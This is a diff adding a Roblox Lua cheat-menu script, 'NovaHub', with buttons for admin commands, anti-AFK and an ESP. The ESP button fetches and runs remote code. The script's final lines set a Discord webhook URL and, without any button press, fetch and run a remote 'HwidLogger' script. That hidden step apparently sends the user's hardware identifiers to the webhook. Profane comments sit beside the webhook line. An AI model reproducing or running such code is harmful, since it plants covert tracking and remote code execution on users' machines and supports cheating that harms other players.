@@ -1,0 +1,164 @@
+if game.CoreGui:FindFirstChild("UI_7") then
+    game.CoreGui["UI_7"]:Destroy()
+end
+
+local UI_7 = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Glow = Instance.new("ImageLabel")
+local Top_Container = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Scroll = Instance.new("ScrollingFrame")
+local Mheehub = Instance.new("TextButton")
+local UIGridLayout = Instance.new("UIGridLayout")
+local Admin = Instance.new("TextButton")
+local AntiAfk = Instance.new("TextButton")
+local YbaEsp = Instance.new("TextButton")
+local ComingSoon = Instance.new("TextButton")
+
+--Properties:
+
+UI_7.Name = "UI_7"
+UI_7.Parent = game.CoreGui
+UI_7.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Main.Name = "Main"
+Main.Parent = UI_7
+Main.BackgroundColor3 = Color3.fromRGB(23, 21, 30)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.352089643, 0, 0.272833735, 0)
+Main.Size = UDim2.new(0, 395, 0, 388)
+Main.Active = true
+Main.Draggable = true
+
+Glow.Name = "Glow"
+Glow.Parent = Main
+Glow.BackgroundColor3 = Color3.fromRGB(165, 228, 255)
+Glow.BackgroundTransparency = 0.850
+Glow.BorderSizePixel = 0
+Glow.Position = UDim2.new(0, -15, 0, -15)
+Glow.Size = UDim2.new(1, 30, 1, 30)
+Glow.ZIndex = 0
+Glow.Image = "rbxassetid://4996891970"
+Glow.ImageColor3 = Color3.fromRGB(15, 15, 15)
+Glow.ScaleType = Enum.ScaleType.Slice
+Glow.SliceCenter = Rect.new(20, 20, 280, 280)
+
+Top_Container.Name = "Top_Container"
+Top_Container.Parent = Main
+Top_Container.AnchorPoint = Vector2.new(0.5, 0)
+Top_Container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Top_Container.BackgroundTransparency = 1.000
+Top_Container.Position = UDim2.new(0.5, 0, 0, 18)
+Top_Container.Size = UDim2.new(1, -40, 0, 20)
+
+Title.Name = "Title"
+Title.Parent = Top_Container
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.Font = Enum.Font.GothamBlack
+Title.Text = "NovaHub - by Nova#9556"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 20.000
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+Scroll.Name = "Scroll"
+Scroll.Parent = Main
+Scroll.Active = true
+Scroll.AnchorPoint = Vector2.new(0.5, 0)
+Scroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scroll.BackgroundTransparency = 1.000
+Scroll.BorderSizePixel = 0
+Scroll.Position = UDim2.new(0.5, 4, 0, 59)
+Scroll.Size = UDim2.new(1, -20, 1, -77)
+Scroll.BottomImage = "rbxassetid://5234388158"
+Scroll.CanvasSize = UDim2.new(0, 0, 0, 450)
+Scroll.MidImage = "rbxassetid://5234388158"
+Scroll.ScrollBarThickness = 6
+Scroll.TopImage = "rbxassetid://5234388158"
+
+Mheehub.Name = "Mheehub"
+Mheehub.Parent = Scroll
+Mheehub.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Mheehub.BackgroundTransparency = 0.650
+Mheehub.Position = UDim2.new(0.0399999991, 0, 0.0201960616, 0)
+Mheehub.Size = UDim2.new(0, 138, 0, 33)
+Mheehub.Font = Enum.Font.GothamBlack
+Mheehub.Text = "MheeHub"
+Mheehub.TextColor3 = Color3.fromRGB(0, 0, 0)
+Mheehub.TextScaled = true
+Mheehub.TextSize = 14.000
+Mheehub.TextWrapped = true
+
+UIGridLayout.Parent = Scroll
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellSize = UDim2.new(0, 160, 0, 50)
+
+Admin.Name = "Admin"
+Admin.Parent = Scroll
+Admin.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Admin.BackgroundTransparency = 0.650
+Admin.Position = UDim2.new(0.0399999991, 0, 0.0201960616, 0)
+Admin.Size = UDim2.new(0, 138, 0, 33)
+Admin.Font = Enum.Font.GothamBlack
+Admin.Text = "RevisAdmin"
+Admin.TextColor3 = Color3.fromRGB(0, 0, 0)
+Admin.TextScaled = true
+Admin.TextSize = 14.000
+Admin.TextWrapped = true
+
+AntiAfk.Name = "AntiAfk"
+AntiAfk.Parent = Scroll
+AntiAfk.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+AntiAfk.BackgroundTransparency = 0.650
+AntiAfk.Position = UDim2.new(0.0399999991, 0, 0.0201960616, 0)
+AntiAfk.Size = UDim2.new(0, 138, 0, 33)
+AntiAfk.Font = Enum.Font.GothamBlack
+AntiAfk.Text = "AntiAfk"
+AntiAfk.TextColor3 = Color3.fromRGB(0, 0, 0)
+AntiAfk.TextScaled = true
+AntiAfk.TextSize = 14.000
+AntiAfk.TextWrapped = true
+
+YbaEsp.Name = "Yba Esp"
+YbaEsp.Parent = Scroll
+YbaEsp.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+YbaEsp.BackgroundTransparency = 0.650
+YbaEsp.Position = UDim2.new(0.0399999991, 0, 0.0201960616, 0)
+YbaEsp.Size = UDim2.new(0, 138, 0, 33)
+YbaEsp.Font = Enum.Font.GothamBlack
+YbaEsp.Text = "Yba Esp"
+YbaEsp.TextColor3 = Color3.fromRGB(0, 0, 0)
+YbaEsp.TextScaled = true
+YbaEsp.TextSize = 14.000
+YbaEsp.TextWrapped = true
+YbaEsp.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haise-yokomoto/new-hub/main/yba%20Esp",true))()
+end)
+
+
+ComingSoon.Name = "ComingSoon"
+ComingSoon.Parent = Scroll
+ComingSoon.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+ComingSoon.BackgroundTransparency = 0.650
+ComingSoon.Position = UDim2.new(0.0399999991, 0, 0.0201960616, 0)
+ComingSoon.Size = UDim2.new(0, 138, 0, 33)
+ComingSoon.Font = Enum.Font.GothamBlack
+ComingSoon.Text = "ComingSoon"
+ComingSoon.TextColor3 = Color3.fromRGB(0, 0, 0)
+ComingSoon.TextScaled = true
+ComingSoon.TextSize = 14.000
+ComingSoon.TextWrapped = true
+ComingSoon.MouseButton1Down:connect(function()
+game.StarterGui:SetCore("SendNotification", {
+Title = "Coming Soon";
+Text = "Be Patient!";
+Duration = 5;
+})
+end)
+wait(5)
+BreadWebHookColor = tonumber(0xAB095b) --- Webhook color, Search up any color (Blue color hex,) Copy the code(blue is #0000FF) paste it after the x and remove the hashtag example(0x0000FF)
+
+BreadWebHook = "https://discord.com/api/webhooks/822149245608001577/lsue77IuWU5LYr43FnH-rb13t-zQheVWGflXcigGP3Rf_lkHMd_wzcSFA-RMv7UuTzy4" --- Dog shit ik fuck off. Just waiting for the "haker" dudes to keep deleting you're webhook. Not my problem ur's
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NenzXD/BreadHub/main/DogShitHwidLogger.lua", true))()
